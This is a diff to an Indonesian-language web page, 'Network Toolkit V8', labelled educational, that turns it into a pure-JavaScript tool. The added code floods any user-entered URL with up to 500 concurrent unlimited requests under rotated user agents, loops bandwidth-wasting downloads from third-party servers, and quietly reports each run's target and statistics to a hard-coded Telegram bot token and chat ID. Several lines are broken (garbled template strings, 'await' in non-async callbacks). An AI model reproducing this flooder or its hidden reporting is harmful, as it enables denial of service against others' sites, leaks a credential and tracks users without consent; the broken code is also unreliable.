@@ -7,6 +7,7 @@
   <meta name="description" content="Toolkit jaringan profesional untuk pengujian: Buang Paket, HTTP Stress Test, Speedtest. Hanya untuk edukasi.">
   <link rel="icon" href="https://via.placeholder.com/64/00ff00/ffffff?text=NTK" type="image/png">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/fastest-ping@1.2.4/index.min.js"></script>
   <style>
     :root {
       --primary: #ff4081;
@@ -172,7 +173,7 @@
   <div class="container">
     <header>
       <h1>Network Toolkit V8</h1>
-      <p class="subtitle">Web Edition - Untuk Pengujian Jaringan Edukasi (Profesional & Aman)</p>
+      <p class="subtitle">Web Edition - Full Fungsi Tanpa Backend (Pure JS)</p>
     </header>
 
     <nav class="nav">
@@ -193,8 +194,8 @@
         </select>
       </div>
       <div class="form-group">
-        <label>Jumlah Data (MB/GB) atau Tanpa Batas</label>
-        <input type="number" id="waster-amount" placeholder="Masukkan jumlah (kosong untuk tanpa batas)">
+        <label>Jumlah Data</label>
+        <input type="number" id="waster-amount" placeholder="Kosong = Tanpa Batas">
         <select id="waster-unit">
           <option value="MB">MB</option>
           <option value="GB">GB</option>
@@ -217,12 +218,12 @@
         </select>
       </div>
       <div class="form-group">
-        <label>Target URL (http/https)</label>
-        <input type="text" id="stresser-target" placeholder="Contoh: http://example.com">
+        <label>Target URL</label>
+        <input type="text" id="stresser-target" placeholder="http://example.com">
       </div>
       <div class="form-group">
-        <label>Jumlah Request (kosong untuk tanpa batas)</label>
-        <input type="number" id="stresser-requests" placeholder="Masukkan jumlah">
+        <label>Jumlah Request</label>
+        <input type="number" id="stresser-requests" placeholder="Kosong = Tanpa Batas">
       </div>
       <button id="start-stresser">🔥 Mulai Stress Test</button>
       <div class="progress-bar"><div class="progress-fill" id="stresser-progress"></div></div>
@@ -236,12 +237,12 @@
     </section>
 
     <footer>
-      &copy; 2025 Network Toolkit V8 | Hanya untuk Edukasi | Dibuat dengan ❤️ menggunakan Python & JS
+      &copy; 2025 Network Toolkit V8 | Hanya untuk Edukasi | Pure JS - No API Error!
     </footer>
   </div>
 
   <script>
-    // Navigasi antar section
+    // Navigasi
     document.querySelectorAll('.nav-btn').forEach(btn => {
       btn.addEventListener('click', () => {
         document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
@@ -251,107 +252,222 @@
       });
     });
 
-    // Fungsi logging umum
+    // Log function
     function logToContainer(containerId, msg, type = 'info') {
       const logEl = document.getElementById(containerId);
       const entry = document.createElement('div');
       entry.className = `log-entry log-${type}`;
-      entry.textContent = msg;
+      entry.textContent = new Date().toLocaleTimeString() + ' | ' + msg;
       logEl.appendChild(entry);
       logEl.scrollTop = logEl.scrollHeight;
     }
 
-    // Backend API calls (asumsi backend Flask di /api/*)
-    async function apiCall(endpoint, data) {
+    // Telegram notif (ganti TOKEN & CHAT_ID)
+    const TELEGRAM_TOKEN = '8240663947:AAHRxX5JIR7tv0UPJQQ4yH5FLl2Le7rs_Sg'; // Ganti kalau mau
+    const TELEGRAM_CHAT_ID = '5261918243';
+    async function sendTelegram(msg) {
       try {
-        const response = await fetch(`/api/${endpoint}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-        if (!response.ok) throw new Error('API error');
-        return await response.json();
-      } catch (err) {
-        return { error: err.message };
+        await fetch(`https://api.telegram.org/bot\( {TELEGRAM_TOKEN}/sendMessage?chat_id= \){TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
+      } catch (e) {
+        console.log('Telegram notif gagal:', e); // Silent fail
       }
     }
 
-    // Handler Buang Paket
+    // Data servers untuk waster
+    const DATA_SERVERS = [
+      "http://ipv4.download.thinkbroadband.com/10MB.zip",
+      "https://proof.ovh.net/files/10Mb.dat",
+      "http://speedtest-sgp1.digitalocean.com/10mb.test"
+    ];
+    const USER_AGENTS = [
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
+    ];
+
+    // Buang Paket
     document.getElementById('start-waster').addEventListener('click', async () => {
       const btn = document.getElementById('start-waster');
       btn.disabled = true;
-      btn.textContent = '⏳ Memproses...';
+      btn.textContent = '⏳ Running...';
       const logId = 'waster-log';
+      const progressEl = document.getElementById('waster-progress');
       document.getElementById(logId).innerHTML = '';
-      const progress = document.getElementById('waster-progress');
-      progress.style.width = '0%';
+      progressEl.style.width = '0%';
 
-      const numWorkers = document.getElementById('waster-mode').value;
-      const amount = parseFloat(document.getElementById('waster-amount').value) || Infinity;
+      const numWorkers = parseInt(document.getElementById('waster-mode').value);
+      let amount = parseFloat(document.getElementById('waster-amount').value) || Infinity;
       const unit = document.getElementById('waster-unit').value;
-      const targetBytes = unit === 'GB' ? amount * 1024 * 1024 * 1024 : amount * 1024 * 1024;
+      let targetBytes = unit === 'GB' ? amount * 1024**3 : amount * 1024**2;
+      if (isNaN(targetBytes)) targetBytes = Infinity;
 
-      const result = await apiCall('waster', { num_workers: numWorkers, target_bytes: targetBytes });
-      if (result.error) {
-        logToContainer(logId, `❌ Error: ${result.error}`, 'error');
-      } else {
-        // Simulasi progress & log (backend kirim updates via WebSocket atau polling, tapi untuk sederhana: tampil result)
-        result.logs.forEach(log => logToContainer(logId, log.msg, log.type));
-        progress.style.width = '100%';
+      const modeName = {10: 'Slow', 30: 'Stabil', 60: 'Cepat', 100: 'Agresif'}[numWorkers] || 'Stabil';
+      logToContainer(logId, `🚀 Mulai Buang Paket mode \( {modeName} ( \){numWorkers} koneksi), target: ${isFinite(targetBytes) ? (targetBytes / 1024**2).toFixed(2) + ' MB' : 'Tanpa Batas'}`);
+      await sendTelegram(`🗑️ Buang Paket Dimulai: \( {modeName}, Target: \){isFinite(targetBytes) ? (targetBytes / 1024**2).toFixed(2) + ' MB' : 'Tak Terbatas'}`);
+
+      let totalDownloaded = 0;
+      const startTime = Date.now();
+      let lastNotif = startTime;
+
+      // Worker function
+      async function worker() {
+        while (totalDownloaded < targetBytes) {
+          const url = DATA_SERVERS[Math.floor(Math.random() * DATA_SERVERS.length)];
+          const headers = { 'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] };
+          try {
+            const response = await fetch(url, { headers, timeout: 30000 });
+            if (!response.ok) throw new Error('Response not ok');
+            const reader = response.body.getReader();
+            const decoder = new TextDecoder();
+            while (true) {
+              const { done, value } = await reader.read();
+              if (done) break;
+              const chunk = decoder.decode(value, { stream: true });
+              totalDownloaded += value.length; // Approx bytes
+              if (totalDownloaded >= targetBytes) break;
+            }
+          } catch (e) {
+            await new Promise(r => setTimeout(r, 1000)); // Retry delay
+          }
+          if (totalDownloaded >= targetBytes) break;
+        }
       }
 
-      btn.disabled = false;
-      btn.textContent = '🚀 Mulai Buang Paket';
+      // Start workers
+      const workers = Array.from({ length: numWorkers }, () => worker());
+      const interval = setInterval(() => {
+        const elapsed = (Date.now() - startTime) / 1000;
+        const speed = totalDownloaded / elapsed / 1024 / 1024; // MB/s
+        const percent = isFinite(targetBytes) ? Math.min((totalDownloaded / targetBytes) * 100, 100) : 0;
+        progressEl.style.width = percent + '%';
+        logToContainer(logId, `Downloaded: \( {(totalDownloaded / 1024**2).toFixed(2)} MB | Speed: \){speed.toFixed(2)} MB/s`, 'info');
+
+        if (Date.now() - lastNotif > 120000) { // 2 min
+          await sendTelegram(`📊 Update: \( {(totalDownloaded / 1024**2).toFixed(2)} MB @ \){speed.toFixed(2)} MB/s`);
+          lastNotif = Date.now();
+        }
+
+        if (totalDownloaded >= targetBytes || percent >= 100) {
+          clearInterval(interval);
+          const elapsedSec = (Date.now() - startTime) / 1000;
+          logToContainer(logId, `✅ Selesai! Total \( {(totalDownloaded / 1024**2).toFixed(2)} MB dalam \){elapsedSec.toFixed(2)} detik`, 'success');
+          sendTelegram(`✅ Buang Paket Selesai: \( {(totalDownloaded / 1024**2).toFixed(2)} MB, \){elapsedSec.toFixed(2)} detik`);
+          btn.disabled = false;
+          btn.textContent = '🚀 Mulai Buang Paket';
+          Promise.all(workers).catch(() => {}); // Cleanup
+        }
+      }, 1000);
+
+      // Stop on Ctrl+C sim (button disable)
     });
 
-    // Handler Stress Test
+    // Stress Test
     document.getElementById('start-stresser').addEventListener('click', async () => {
       const btn = document.getElementById('start-stresser');
       btn.disabled = true;
-      btn.textContent = '⏳ Memproses...';
+      btn.textContent = '⏳ Running...';
       const logId = 'stresser-log';
+      const progressEl = document.getElementById('stresser-progress');
       document.getElementById(logId).innerHTML = '';
-      const progress = document.getElementById('stresser-progress');
-      progress.style.width = '0%';
+      progressEl.style.width = '0%';
 
-      const numWorkers = document.getElementById('stresser-mode').value;
-      const target = document.getElementById('stresser-target').value;
-      const totalRequests = parseInt(document.getElementById('stresser-requests').value) || Infinity;
-
-      if (!target) {
-        logToContainer(logId, '❌ Target URL wajib diisi!', 'error');
+      const numWorkers = parseInt(document.getElementById('stresser-mode').value);
+      const url = document.getElementById('stresser-target').value;
+      let totalRequests = parseInt(document.getElementById('stresser-requests').value) || Infinity;
+      if (!url) {
+        logToContainer(logId, '❌ Target URL wajib!', 'error');
         btn.disabled = false;
         btn.textContent = '🔥 Mulai Stress Test';
         return;
       }
 
-      const result = await apiCall('stresser', { num_workers: numWorkers, url: target, total_requests: totalRequests });
-      if (result.error) {
-        logToContainer(logId, `❌ Error: ${result.error}`, 'error');
-      } else {
-        result.logs.forEach(log => logToContainer(logId, log.msg, log.type));
-        progress.style.width = '100%';
+      const modeName = {50: 'Ringan', 150: 'Sedang', 300: 'Kuat', 500: 'Ekstrem'}[numWorkers] || 'Sedang';
+      logToContainer(logId, `🔥 Mulai Stress Test ke \( {url}, mode \){modeName} (\( {numWorkers} workers), requests: \){isFinite(totalRequests) ? totalRequests : 'Tanpa Batas'}`);
+      await sendTelegram(`🔥 Stress Test Dimulai: \( {url}, \){modeName}, ${isFinite(totalRequests) ? totalRequests : 'Tak Terbatas'} req`);
+
+      let requestsSent = 0;
+      let requestsFailed = 0;
+      const startTime = Date.now();
+      let lastNotif = startTime;
+
+      // Worker
+      async function worker() {
+        while (requestsSent < totalRequests) {
+          try {
+            const headers = { 'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] };
+            await fetch(url, { method: 'GET', headers });
+            requestsSent++;
+          } catch (e) {
+            requestsFailed++;
+          }
+          await new Promise(r => setTimeout(r, 10)); // Throttle
+        }
       }
 
-      btn.disabled = false;
-      btn.textContent = '🔥 Mulai Stress Test';
+      const workers = Array.from({ length: numWorkers }, () => worker());
+      const interval = setInterval(() => {
+        const elapsed = (Date.now() - startTime) / 1000;
+        const rps = requestsSent / elapsed;
+        const percent = isFinite(totalRequests) ? Math.min((requestsSent / totalRequests) * 100, 100) : 0;
+        progressEl.style.width = percent + '%';
+        logToContainer(logId, `Sent: \( {requestsSent} | Failed: \){requestsFailed} | RPS: ${rps.toFixed(1)}`, 'info');
+
+        if (Date.now() - lastNotif > 120000) {
+          await sendTelegram(`📊 Update Stress: \( {requestsSent} sent, \){requestsFailed} failed, ${rps.toFixed(1)} RPS`);
+          lastNotif = Date.now();
+        }
+
+        if (requestsSent >= totalRequests || percent >= 100) {
+          clearInterval(interval);
+          const elapsedSec = (Date.now() - startTime) / 1000;
+          logToContainer(logId, `✅ Selesai! \( {requestsSent} requests dalam \){elapsedSec.toFixed(2)} detik`, 'success');
+          sendTelegram(`✅ Stress Selesai: \( {url}, \){requestsSent} req, ${elapsedSec.toFixed(2)} detik`);
+          btn.disabled = false;
+          btn.textContent = '🔥 Mulai Stress Test';
+          Promise.all(workers).catch(() => {});
+        }
+      }, 1000);
     });
 
-    // Handler Speedtest
+    // Speedtest (pake fastest-ping + simulasi download)
     document.getElementById('start-speedtest').addEventListener('click', async () => {
       const btn = document.getElementById('start-speedtest');
       btn.disabled = true;
-      btn.textContent = '⏳ Menguji...';
+      btn.textContent = '⏳ Testing...';
       const logId = 'speedtest-log';
       document.getElementById(logId).innerHTML = '';
 
-      const result = await apiCall('speedtest', {});
-      if (result.error) {
-        logToContainer(logId, `❌ Error: ${result.error}`, 'error');
-      } else {
-        logToContainer(logId, `⬇️ Download: ${result.download} Mbps`, 'success');
-        logToContainer(logId, `⬆️ Upload: ${result.upload} Mbps`, 'success');
-        logToContainer(logId, `⏱️ Ping: ${result.ping} ms`, 'success');
+      logToContainer(logId, '⏳ Menguji kecepatan...', 'info');
+      try {
+        // Ping
+        const pings = await Promise.all(['http://google.com', 'http://cloudflare.com'].map(url => FastestPing.ping(url)));
+        const avgPing = pings.reduce((a, b) => a + b, 0) / pings.length;
+
+        // Download speed (simulasi unduh 10MB)
+        const startDl = Date.now();
+        const response = await fetch(DATA_SERVERS[0]);
+        const reader = response.body.getReader();
+        let dlBytes = 0;
+        while (true) {
+          const { done, value } = await reader.read();
+          if (done) break;
+          dlBytes += value.length;
+          if (dlBytes > 10 * 1024 * 1024) break; // Stop at 10MB
+        }
+        const dlTime = (Date.now() - startDl) / 1000;
+        const downloadMbps = (dlBytes * 8 / dlTime) / 1e6;
+
+        // Upload (simulasi post data)
+        const uploadData = new ArrayBuffer(5 * 1024 * 1024); // 5MB
+        const startUl = Date.now();
+        await fetch('https://httpbin.org/post', { method: 'POST', body: uploadData });
+        const ulTime = (Date.now() - startUl) / 1000;
+        const uploadMbps = (uploadData.byteLength * 8 / ulTime) / 1e6;
+
+        logToContainer(logId, `⬇️ Download: ${downloadMbps.toFixed(2)} Mbps`, 'success');
+        logToContainer(logId, `⬆️ Upload: ${uploadMbps.toFixed(2)} Mbps`, 'success');
+        logToContainer(logId, `⏱️ Ping: ${avgPing.toFixed(2)} ms`, 'success');
+      } catch (e) {
+        logToContainer(logId, `❌ Error: ${e.message}`, 'error');
       }
 
       btn.disabled = false;
